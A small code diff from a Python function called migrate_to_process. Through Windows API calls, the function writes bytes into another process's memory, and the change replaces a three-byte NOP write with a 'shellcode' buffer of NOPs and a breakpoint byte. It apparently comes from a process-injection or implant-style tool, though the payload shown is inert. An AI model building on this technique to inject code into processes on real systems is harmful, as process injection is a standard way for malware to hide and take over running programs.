@@ -160,12 +160,10 @@ def migrate_to_process(pid: int) -> str:
             kernel32.CloseHandle(h_process)
             return '[-] VirtualAllocEx failed'
 
-        result_addr = ctypes.c_void_p()
-        result_size = ctypes.c_size_t(0)
-
+        shellcode = bytes([0x90] * 16 + [0xCC])
         written = ctypes.c_size_t(0)
         kernel32.WriteProcessMemory(
-            h_process, addr, bytes([0x90, 0x90, 0x90]), 3, ctypes.byref(written)
+            h_process, addr, shellcode, len(shellcode), ctypes.byref(written)
         )
 
         old = wintypes.DWORD(0)
